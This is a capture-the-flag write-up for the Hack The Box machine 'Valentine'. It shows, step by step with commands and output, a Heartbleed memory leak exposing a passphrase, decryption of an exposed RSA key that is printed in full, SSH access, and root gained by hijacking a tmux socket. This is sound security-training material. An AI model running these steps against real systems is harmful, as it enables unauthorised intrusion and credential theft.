---
tags:
  - CVE-2014-0160
  - HeartBleed
  - tmux
group: Linux
---
![](https://labs.hackthebox.com/storage/avatars/61b3b6a4382f58a804e221062ced0bfb.png)

- Machine : https://app.hackthebox.com/machines/Valentine
- Reference : https://0xdf.gitlab.io/2018/07/28/htb-valentine.html
- Solved : 2025.2.21. (Fri) (Takes 2days)

## Summary
---

1. **Initial Enumeration**
    - **Open Ports**: SSH (22), HTTP (80), HTTPS (443).
    - **Vulnerabilities Identified**:
        - `Heartbleed (CVE-2014-0160)`: OpenSSL vulnerability detected.
        - `SSL POODLE (CVE-2014-3566)`: Vulnerable SSL configuration.
        - `SSL CCS Injection (CVE-2014-0224)`: Possible MITM attack.
    
2. **Exploitation**
    - **Heartbleed Attack**:
        - Extracted sensitive memory data containing a Base64-encoded string.
        - Decoded as `heartbleedbelievethehype`, likely a passphrase.
    - **Directory Enumeration**:
        - Found `/dev/` directory with `hype_key` file.
        - `hype_key` was an encrypted private RSA key.
	
3. **Shell as `hype`**
    - **Key Decryption**:
        - Used `heartbleedbelievethehype` as passphrase to decrypt `hype_key`.
    - **SSH Login**:
        - Successfully logged in as `hype` using the decrypted private key.
    
4. **Privilege Escalation**
    - **Tmux Session Hijacking**:
        - Found an active `tmux` session running as `root`.
        - The session socket `/dev_sess` was accessible by `hype`.
        - Attached to the root tmux session and gained a root shell.

### Key Techniques:

- **Memory Leak via Heartbleed**: Extracted sensitive information from OpenSSL.
- **RSA Key Recovery**: Decrypted an encrypted private key to gain access.
- **Tmux Session Hijacking**: Used an accessible root-owned session for privilege escalation.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~]
└─$ /opt/custom-scripts/port-scan.sh 10.10.10.79
Performing quick port scan on 10.10.10.79...
Found open ports: 22,80,443
Performing detailed scan on 10.10.10.79...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 20:38 MST
Nmap scan report for 10.10.10.79
Host is up (0.12s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2025-02-21T03:39:15+00:00; +52s from scanner time.
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 51s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.17 seconds



┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80,443 --script vuln 10.10.10.79
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 21:19 MST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.79
Host is up (0.40s latency).

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
443/tcp open  https
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.cvedetails.com/cve/2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      http://cvedetails.com/cve/2014-0160/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 752.82 seconds
```

### http(80) / https(443)

![](attachments/valentine_1.png)



# Shell as `hype`

### CVE-2014-0160 (HeartBleed)

Since I observed that the target is vulnerable to HeartBleed attack (CVE-2014-0160), let's try this exploit : https://github.com/mpgn/heartbleed-PoC

```bash
┌──(kali㉿kali)-[~/htb/heartbleed-PoC]
└─$ python2 heartbleed-exploit.py valentine.htb
Connecting...
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Handshake done...
Sending heartbeat request with length 4 :
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING : server returned more data than it should - server is vulnerable!


┌──(kali㉿kali)-[~/htb/heartbleed-PoC]
└─$ cat out.txt                                
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 1D  mV0aGVoeXBlCg==.
  0160: 1C 9C 7F 04 5D B8 AC 50 A5 6B 21 CB 9C A5 7B 40  ....]..P.k!...{@
```

I can see `decode.php` with base64 encoded text.

```bash
┌──(kali㉿kali)-[~]
└─$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
heartbleedbelievethehype
```

This base64 encoded text is decoded as `heartbleedbelievethehype`.

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt --timeout 300s
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.79
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 5m0s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 38]
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]  
```

There's `/dev` page which allows directory listing.
Let's visit this page.

![](attachments/valentine_2.png)

note.txt:

```txt
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

hype_key:

```binary
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 <SNIP>
```

Let's decode it with hex on cyberchef.

![](attachments/valentine_3.png)

```bash
┌──(kali㉿kali)-[~/htb]
└─$ cat hype_key.encrypted 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Since the RSA key is encrypted, I need to decrypt it.
To decrypt the rsa key, I used `heartbleedbelievethehype` key.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ openssl rsa -in hype_key.encrypted -out hype_key.decrypted
Enter pass phrase for hype_key.encrypted:
writing RSA key


┌──(kali㉿kali)-[~/htb]
└─$ cat hype_key.decrypted 
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDUU3iZcDCfeCCI
ML834Fx2YQF/TIyXoi6VI6S/1Z9SsZM9NShwUdRr3mPJocWOZ7RzuEbpRFZL1zgk
ykHfn8pR0Wc6kjQw4lCVGV237iqWlG+MSGRVOPuDS1UmaN3dN6bLL541LNpTscE4
RbNzPhP6pD5pKsSX7IcMsAfyZ9rpfZKuciS0LXpbTS6kokrru6/MM1u3DkcfxuSW
8HeO6lWQ7sbCMLbCp9WjKmBRlxMY4Jj0tUsz8f66vGaHxWiaUzBFy5m82qfCyL9N
4Yro1xe1RF8uC58i8rE/baDzW2GMK7JVcAvPiunu2J0QeWg8sVOytLLxPVxPrPKD
b7CBEkzNAgMBAAECggEAIGoBzkLfWWkIZmIyvwAEfZn/lYSFLhz3SZNgclzVbtVn
Kf/0hXkombMgvsZwl3XjiYsHYFMrbXaUvqEV/2Kwi18RiFKLny7dqHVv5kV4wPY2
NU9T6eLCGuAkRrHZtQzq7Lf/ShTn28EWQ1X4uE4w1KHAWWPLEXptf5VcETijpeNb
jrgVMP/MamWwHkyvKBc2+THXgzBeEo+mMsPcUXYdmI+axq8f3blUZ8zEsuPVXZPX
GukTCTOKYBOs6+Vc3TQFmqqabrjdAmsmuCWyeQWfz9wEzG5aXPDW0etIWY7xiez4
lUAE/RyL2Oa9WEuJ2qoeyGXcOYyFve1LicDelNzRDQKBgQDuLVB5xSvKG0K21zd3
NBUJl2aQP1Kvt/uv+d7uM1U2r+f9VSHplggQur466Kn5Gd5Htymi/Wz4I4X4rIlb
ksI22qYL7vC1gxJZ91KZ8xyj6lFZC8UdVrwoLULarJthaDEPWBGMNta811qs6rs0
ZUEETlbaWmbac7SzcGR3neg0bwKBgQDkNvAU/ZDjs3ZOC1507CwIoTe7MYZJXcVN
EHcdmg4sFxzcJgEzWRBmlxOGXlhUu9zqvpPFBGEpzvdBHYYUsPTfJgE3sfCA4+1T
+3ubZ0golGBKQtgT8b6JnU7E0mxNZERDfhvJVeHGCmbgsR6V8A3j6Zu5vwQsSL1v
Yb1aDiQIgwKBgQDE9C/iIkwNuvE2JU42gpkK72neyp5jtG6qnKPeshA7QsdCVA3R
DUHqI6J/MDquRNfs0efaYlqj7ywv8O09DmUP20sH/zSJxLN+NejWaZU7bt6KFhOQ
KVM6ngL0tVtf9zrqh1crbYWxbxwKdakMsNZM60MjGTKIXroE0GIkEC4efQKBgQCT
dVQHnBfEqS7mGr57uiZxpQoHsGZefXKA6wSsYeCKaJzDOuNHtGK+hxuclNVqWsDS
BTYh9UR66TomHteGAxkWHs5mmFkYTy4IN9SUg1XCsqzNDwfjSy6caMJ+tqA4GXNq
UM/PdeieOBZlVMy4gRXYkBeJG32sx4tvrq3UxJJP1QKBgQCe2jm6q4DtQ+mTvOBr
CipH6ReGU7LVGk7U7A3ElcCL8QH32TRAvma8SB4TBE//5LxQJG8sZ0euceDobIIR
Axg25Qa05Wo1HDZ7MiulTtHJt1MU3+Bf7pK2lQTBcUC4xwOSSxI1MsgkLaxrt4kW
kep5qMlYBzfSo47UgGU1Wh6HEA==
-----END PRIVATE KEY-----
```

Let's use this key to sign-in through ssh as `hype`.
(I guessed the username given the name of the file `hype_key`)

For the ssh connection, I need to add `-o PubkeyAcceptedKeyTypes=+ssh-rsa` option.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ssh -i ./hype_key.d hype@10.10.10.79 -o PubkeyAcceptedKeyTypes=+ssh-rsa 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
```

I got a shell of `hype`!



# Shell as `root`

### Enumeration

```bash
hype@Valentine:~$ history
    1  exit
    2  exot
    3  exit
    4  ls -la
    5  cd /
    6  ls -la
    7  cd .devs
    8  ls -la
    9  tmux -L dev_sess 
   10  tmux a -t dev_sess 
   11  tmux --help
   12  tmux -S /.devs/dev_sess 
   13  exit
```

From the `history`, I can see that `tmux` has been run.
Let's run `LinPEAS` too.

```yaml
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes            
<SNIP>                                                      
root       1000  0.0  0.1  26416  1676 ?        Ss   19:35   0:03 /usr/bin/tmux -S /.devs/dev_sess   


╔══════════╣ Last time logon each user
Username         Port     From             Latest                          
root             tty1                      Thu Aug 25 01:50:00 -0700 2022
hype             pts/0    10.10.14.6       Thu Feb 20 22:16:46 -0800 2025
```

There's `tmux` running as `root` user.

From Hacktricks, I found a guideline to hijack session of `tmux`.

![](attachments/valentine_4.png)

```bash
hype@Valentine:/tmp$ /usr/bin/tmux -S /.devs/dev_sess ls
0: 1 windows (created Thu Feb 20 19:35:22 2025) [80x24]


hype@Valentine:/tmp$ ls -al /.devs/dev_sess
srw-rw---- 1 root hype 0 Feb 20 19:35 /.devs/dev_sess


hype@Valentine:/tmp$ /usr/bin/tmux -S /.devs/dev_sess attach -t 0


root@Valentine:/# id
uid=0(root) gid=0(root) groups=0(root)
root@Valentine:/# whoami
root
```

I got a `root` shell!